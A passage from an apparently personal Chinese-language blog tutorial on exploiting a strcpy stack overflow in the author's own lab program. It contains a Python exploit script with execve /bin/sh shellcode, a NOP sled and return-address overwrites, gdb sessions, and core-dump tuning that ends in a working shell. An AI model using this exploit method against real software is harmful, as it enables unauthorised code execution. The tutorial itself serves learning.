(argc=&lt;error reading variable: Cannot access memory at address 0x41414141&gt;, <br>    argv=&lt;error reading variable: Cannot access memory at address 0x41414145&gt;) at bol.c:7<br>7       &#125;<br></code></pre></td></tr></table></figure><p>反汇编：</p><p><a href="https://blog.csdn.net/rznice/article/details/82052815/">GDB disassemble_rznice的博客-CSDN博客_gdb中disassemble</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> disassemble <span class="hljs-variable">$pc</span></span><br>Dump of assembler code for function main:<br>   0x08049176 &lt;+0&gt;:     lea    ecx,[esp+0x4]<br>   0x0804917a &lt;+4&gt;:     and    esp,0xfffffff0<br>   0x0804917d &lt;+7&gt;:     push   DWORD PTR [ecx-0x4]<br>   0x08049180 &lt;+10&gt;:    push   ebp<br>   0x08049181 &lt;+11&gt;:    mov    ebp,esp<br>   0x08049183 &lt;+13&gt;:    push   ebx<br>   0x08049184 &lt;+14&gt;:    push   ecx<br>   0x08049185 &lt;+15&gt;:    sub    esp,0x70<br>   0x08049188 &lt;+18&gt;:    call   0x80490b0 &lt;__x86.get_pc_thunk.bx&gt;<br>   0x0804918d &lt;+23&gt;:    add    ebx,0x2e73<br>   0x08049193 &lt;+29&gt;:    mov    eax,ecx<br>   0x08049195 &lt;+31&gt;:    mov    eax,DWORD PTR [eax+0x4]<br>   0x08049198 &lt;+34&gt;:    add    eax,0x4<br>   0x0804919b &lt;+37&gt;:    mov    eax,DWORD PTR [eax]<br>   0x0804919d &lt;+39&gt;:    sub    esp,0x8<br>   0x080491a0 &lt;+42&gt;:    push   eax<br>   0x080491a1 &lt;+43&gt;:    lea    eax,[ebp-0x6c]<br>   0x080491a4 &lt;+46&gt;:    push   eax<br>   0x080491a5 &lt;+47&gt;:    call   0x8049030 &lt;strcpy@plt&gt;<br>   0x080491aa &lt;+52&gt;:    add    esp,0x10<br>   0x080491ad &lt;+55&gt;:    sub    esp,0xc<br>   0x080491b0 &lt;+58&gt;:    lea    eax,[ebx-0x1ff8]<br>   0x080491b6 &lt;+64&gt;:    push   eax<br>   0x080491b7 &lt;+65&gt;:    call   0x8049040 &lt;puts@plt&gt;<br>   0x080491bc &lt;+70&gt;:    add    esp,0x10<br>   0x080491bf &lt;+73&gt;:    nop<br>   0x080491c0 &lt;+74&gt;:    lea    esp,[ebp-0x8]<br>   0x080491c3 &lt;+77&gt;:    pop    ecx<br>   0x080491c4 &lt;+78&gt;:    pop    ebx<br>   0x080491c5 &lt;+79&gt;:    pop    ebp<br>   0x080491c6 &lt;+80&gt;:    lea    esp,[ecx-0x4]<br>=&gt; 0x080491c9 &lt;+83&gt;:    ret    <br>End of assembler dump.<br></code></pre></td></tr></table></figure><p>通过查看汇编代码，发现程序在运行完puts后不是leave;ret，而是又运行了五句代码，也就是这些代码使指针esp发生变化，返回地址也相应地发生了变化。</p><p>分析得知，[ebp-8]-4才是返回地址，重新构造数据：</p><p><strong>c.py：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash">!/usr/bin/python3</span><br>import sys<br><br>shellcode = (<br>b&#x27;\x31\xc0\x89\xc3\xb0\x17\xcd\x80\x31\xd2&#x27; +<br>b&#x27;\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89&#x27; +<br>b&#x27;\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80&#x27;<br>)<br><br>nopsled = b&#x27;\x90&#x27; * 64<br>padding = b&#x27;A&#x27; *(112 - 64 - 32-12)<br>eip = b&#x27;\x80\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x30\xd0\xff\xff&#x27;<br><br>sys.stdout.buffer.write(nopsled + shellcode +padding +eip)<br></code></pre></td></tr></table></figure><h2 id="Testing-Exploit-3-in-gdb"><a href="#Testing-Exploit-3-in-gdb" class="headerlink" title="Testing Exploit 3 in gdb"></a>Testing Exploit 3 in gdb</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd00c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd380 --&gt; 0xffd080ff <br>EDX: 0xffffd073 --&gt; 0xffd080ff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd078 --&gt; 0xffffd080 --&gt; 0x0 <br>ESP: 0xffffd000 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd000 --&gt; 0x0 <br>0004| 0xffffd004 --&gt; 0x1 <br>0008| 0xffffd008 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd00c --&gt; 0x90909090 <br>0016| 0xffffd010 --&gt; 0x90909090 <br>0020| 0xffffd014 --&gt; 0x90909090 <br>0024| 0xffffd018 --&gt; 0x90909090 <br>0028| 0xffffd01c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x0, argv=0x8049060 &lt;_start&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd000:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd010:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd020:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd050:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd060:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd070:     0xffffd080      0xffffd080      0xffffd080      0xffffd030<br>0xffffd080:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd090:     0x00000002      0xffffd134      0xffffd140      0xffffd0c4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 8946 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[Attaching after process 8946 vfork to child process 8951]<br>[New inferior 2 (process 8951)]<br>[Detaching vfork parent process 8946 after child exec]<br>[Inferior 1 (process 8946) detached]<br>process 8951 is executing new program: /usr/bin/id<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br><span class="hljs-meta">$</span><span class="bash"> [Inferior 2 (process 8951) exited normally]</span><br>Warning: not running<br>zsh: suspended (tty output)  gdb -q bol<br>                                                                                                                 <br>┌──(kali㉿kali)-[~/StackOverflowtest]<br>└─$<br></code></pre></td></tr></table></figure><p>成功得到一个 shell，且得到了 id，但退出了，应该是 peda 的问题（因为用过一次没有 peda 的 gdb，记得是没有退出）</p><h2 id="Testing-Exploit-3-in-the-Normal-Shell"><a href="#Testing-Exploit-3-in-the-Normal-Shell" class="headerlink" title="Testing Exploit 3 in the Normal Shell"></a>Testing Exploit 3 in the Normal Shell</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py)</span><br>Done!<br>zsh: segmentation fault  ./bol $(python3 c.py)<br></code></pre></td></tr></table></figure><p>看来选择的 Nop 位置不行，可以尝试换位置直到可以利用。这里我选择删除 gdb 环境变量进行尝试。</p><blockquote><p>事实证明，gdb 环境和应用程序运行的实际环境略有不同。gdb 将设置一些称为 LINES 和 COLUMNS 的环境变量，以正确显示终端上的输出。 这对于整洁漂亮的输出非常有用，但对于环境对更改过于敏感的漏洞利用开发则不利。</p></blockquote><p>删除LINES和COLUMNS变量：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> show environment</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment LINES</span> <br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">unset</span> environment COLUMNS</span><br></code></pre></td></tr></table></figure><p>我们可以通过使用 show environment 命令检查变量是否未设置。</p><p>重新运行调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd02c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd3a0 --&gt; 0x4300ffff <br>EDX: 0xffffd09e --&gt; 0xffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd098 --&gt; 0xffffd080 --&gt; 0x52e38969 <br>ESP: 0xffffd020 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd020 --&gt; 0x0 <br>0004| 0xffffd024 --&gt; 0x1 <br>0008| 0xffffd028 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd02c --&gt; 0x90909090 <br>0016| 0xffffd030 --&gt; 0x90909090 <br>0020| 0xffffd034 --&gt; 0x90909090 <br>0024| 0xffffd038 --&gt; 0x90909090 <br>0028| 0xffffd03c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x52e38969, argv=0x8de18953) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd020:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd050:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd060:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd070:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd080:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd090:     0xffffd080      0xffffd080      0xffffd080      0xffffd030<br>0xffffd0a0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0b0:     0x00000002      0xffffd154      0xffffd160      0xffffd0e4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> </span><br></code></pre></td></tr></table></figure><p>发现栈的位置发生了偏移，ebp变成了0xfffffd098</p><p>修改数据：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">eip = <span class="hljs-string">b&#x27;\xa0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x50\xd0\xff\xff&#x27;</span><br></code></pre></td></tr></table></figure><p>再次尝试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run $(python3 c.py)</span><br>Starting program: /home/kali/StackOverflowtest/bol $(python3 c.py)<br>[----------------------------------registers-----------------------------------]<br>EAX: 0xffffd02c --&gt; 0x90909090 <br>EBX: 0x804c000 --&gt; 0x804bf14 --&gt; 0x1 <br>ECX: 0xffffd3a0 --&gt; 0x4300ffff <br>EDX: 0xffffd09e --&gt; 0xffff <br>ESI: 0x2 <br>EDI: 0x8049060 (&lt;_start&gt;:       xor    ebp,ebp)<br>EBP: 0xffffd098 --&gt; 0xffffd080 --&gt; 0x52e38969 <br>ESP: 0xffffd020 --&gt; 0x0 <br>EIP: 0x80491ad (&lt;main+55&gt;:      sub    esp,0xc)<br>EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)<br>[-------------------------------------code-------------------------------------]<br>   0x80491a4 &lt;main+46&gt;: push   eax<br>   0x80491a5 &lt;main+47&gt;: call   0x8049030 &lt;strcpy@plt&gt;<br>   0x80491aa &lt;main+52&gt;: add    esp,0x10<br>=&gt; 0x80491ad &lt;main+55&gt;: sub    esp,0xc<br>   0x80491b0 &lt;main+58&gt;: lea    eax,[ebx-0x1ff8]<br>   0x80491b6 &lt;main+64&gt;: push   eax<br>   0x80491b7 &lt;main+65&gt;: call   0x8049040 &lt;puts@plt&gt;<br>   0x80491bc &lt;main+70&gt;: add    esp,0x10<br>[------------------------------------stack-------------------------------------]<br>0000| 0xffffd020 --&gt; 0x0 <br>0004| 0xffffd024 --&gt; 0x1 <br>0008| 0xffffd028 --&gt; 0xf7ffd9d0 --&gt; 0x0 <br>0012| 0xffffd02c --&gt; 0x90909090 <br>0016| 0xffffd030 --&gt; 0x90909090 <br>0020| 0xffffd034 --&gt; 0x90909090 <br>0024| 0xffffd038 --&gt; 0x90909090 <br>0028| 0xffffd03c --&gt; 0x90909090 <br>[------------------------------------------------------------------------------]<br>Legend: code, data, rodata, value<br><br>Breakpoint 1, main (argc=0x0, argv=0x8049060 &lt;_start&gt;) at bol.c:6<br>6           printf(&quot;Done!\n&quot;);<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd020:     0x00000000      0x00000001      0xf7ffd9d0      0x90909090<br>0xffffd030:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd040:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd050:     0x90909090      0x90909090      0x90909090      0x90909090<br>0xffffd060:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd070:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd080:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd090:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0a0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0b0:     0x00000002      0xffffd154      0xffffd160      0xffffd0e4<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> c</span><br>Continuing.<br>Done!<br>process 9309 is executing new program: /usr/bin/dash<br>Error in re-setting breakpoint 1: No source file named /home/kali/StackOverflowtest/bol.c.<br><span class="hljs-meta">$</span><span class="bash"> id</span><br>[Attaching after process 9309 vfork to child process 9314]<br>[New inferior 2 (process 9314)]<br>[Detaching vfork parent process 9309 after child exec]<br>[Inferior 1 (process 9309) detached]<br>process 9314 is executing new program: /usr/bin/id<br>[Thread debugging using libthread_db enabled]<br>Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.<br>uid=1000(kali) gid=1000(kali) groups=1000(kali),4(adm),20(dialout),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),117(bluetooth),120(wireshark),134(scanner),142(kaboxer)<br>[Inferior 2 (process 9314) exited normally]<br><span class="hljs-meta">$</span><span class="bash"> Warning: not running</span><br>zsh: suspended (tty output)  gdb -q bol<br><br><br>┌──(kali㉿kali)-[~/StackOverflowtest]<br>└─$ ./bol $(python3 c.py )<br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br></code></pre></td></tr></table></figure><p>shell 再次失败。只能换另一种方式，通过错误输出来找真正的地址。</p><p>通过 core dump 的方式获取真实的地址：</p><blockquote><p>原文链接：<a href="https://blog.csdn.net/bitsec/article/details/81026447">https://blog.csdn.net/bitsec/article/details/81026447</a></p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">#</span><span class="bash"> 产生 core 文件，就是程序运行发生段错误时的文件。写入错误的 ret_addr，导致程序错误，会得到 core 文件，然后通过调试 core 文件找到正确的 buf 的其实地址。</span><br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">ulimit</span> -c unlimited</span><br><span class="hljs-meta">$</span><span class="bash"> sudo sh -c <span class="hljs-string">&#x27;echo &quot;/tmp/core.%t&quot; &gt; /proc/sys/kernel/core_pattern&#x27;</span></span><br></code></pre></td></tr></table></figure><p>运行，得到错误输出：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br>zsh: segmentation fault (core dumped)  ./bol $(python3 c.py )<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> ls /tmp</span><br>core.1657100523<br></code></pre></td></tr></table></figure><p>gdb 调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q vuln /tmp/core.1657100523</span><br>vuln: No such file or directory.<br>[New LWP 9988]<br>Core was generated by `./bol ����������������������������������������������������������������1��ð1&#x27;.<br>Program terminated with signal SIGSEGV, Segmentation fault.<br><span class="hljs-meta">#</span><span class="bash">0  0x90909090 <span class="hljs-keyword">in</span> ?? ()</span><br><span class="hljs-meta">gdb-peda$</span><span class="bash"> x/40x <span class="hljs-variable">$esp</span></span><br>0xffffd0a0:     0x90909090      0x90909090      0x90909090      0xc389c031<br>0xffffd0b0:     0x80cd17b0      0x6852d231      0x68732f6e      0x622f2f68<br>0xffffd0c0:     0x52e38969      0x8de18953      0x80cd0b42      0x41414141<br>0xffffd0d0:     0xffffd0a0      0xffffd080      0xffffd080      0xffffd050<br>0xffffd0e0:     0x00000000      0x08049060      0x00000000      0xf7dda905<br>0xffffd0f0:     0x00000002      0xffffd194      0xffffd1a0      0xffffd124<br>0xffffd100:     0xffffd134      0xf7ffdb98      0xf7fc3420      0xf7fa7000<br>0xffffd110:     0x00000001      0x00000000      0xffffd178      0x00000000<br>0xffffd120:     0xf7ffd000      0x00000000      0x00000002      0x08049060<br>0xffffd130:     0x00000000      0x79122a66      0x3de2b676      0x00000000<br></code></pre></td></tr></table></figure><p>发现栈的位置发生了偏移，ebp 变成了 0xfffffd0d8 </p><p>修改数据：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">eip = b&#x27;\xe0\xd0\xff\xff\x80\xd0\xff\xff\x80\xd0\xff\xff\x90\xd0\xff\xff&#x27;<br></code></pre></td></tr></table></figure><p>再次尝试，成功得到 shell：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> ./bol $(python3 c.py )</span><br>Done!<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>kali<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">exit</span></span><br></code></pre></td></tr></table></figure><h2 id="Adjusting-the-Exploit"><a href="#Adjusting-the-Exploit" class="headerlink" title="Adjusting the Exploit"></a>Adjusting the Exploit</h2><p>When I did it with these values, no adjustment was necessary, but when I was developing this project with slight variations in the vulnerable code, the exloit worked in gdb but not in the real shell.</p><p>That’s a common occurrence, and the reason for the NOP sled. If that happens to you, adjust the return value in the exploit file using hexedit until it works.</p><h2 id="64-bit-Linux-program"><a href="#64-bit-Linux-program" class="headerlink" title="64 bit Linux program"></a>64 bit Linux program</h2><p>gdb 调试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> gdb -q bol_64</span><br>Reading symbols from bol_64...<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> list</span><br>1       #include &lt;string.h&gt;<br>2       #include &lt;stdio.h&gt;<br>3       void main(int argc, char *argv[]) &#123;<br>4           char buffer[100];<br>5           strcpy(buffer, argv[1]);<br>6           printf(&quot;Done!\n&quot;);<br>7       &#125;<br><span class="hljs-meta">gdb-peda$</span><span class="bash"> <span class="hljs-built_in">break</span> 6</span><br>Breakpoint 1 at 0x40115f: file bol.c, line 6.<br></code></pre></td></tr></table></figure><p>正常运行，输入 8 个 A ：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">gdb-peda$</span><span class="bash"> run AAAAAAAA</span><br>Starting program: /home/kali/StackOverflowtest/bol_64 AAAAAAAA<br>[----------------------------------registers-----------------------------------]<br>RBP: 0x7fffffffdf10 --&gt; 0x0 <br>RSP: 0x7fffffffde90 --&gt; 0x7fffffffe008 --&gt; 0x7fffffffe35a (&quot;/home/kali/StackOverflowtest/bol_64&quot;)<br>RIP: 0x40115f (&lt;main+41&gt;:       lea    rax,[rip+0xe9e]        # 